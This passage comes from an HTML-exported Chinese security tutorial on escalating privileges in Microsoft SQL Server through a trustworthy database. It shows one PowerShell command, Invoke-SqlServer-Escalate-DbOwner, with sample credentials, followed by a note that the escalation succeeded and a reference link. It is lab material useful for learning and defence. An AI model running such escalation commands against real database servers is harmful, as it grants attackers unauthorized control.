class="cs9C1B1871">的权限取消掉，这里可以自行取消掉，但是要添加就会报错</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image14.png" width="560" height="440" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">Invoke-SqlServer-Escalate-DbOwner -SqlUser MyAppUser01 -SqlPass MyPassword! -SqlServerInstance WIN-80LVKKRM5UA</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e5%8f%97%e4%bf%a1%e7%94%a8%e6%95%b0%e6%8d%ae%e5%ba%93%e6%8f%90%e6%9d%83_files/image15.png" width="560" height="265" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">成功提权！！</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/8188</span></p></body>
</html>
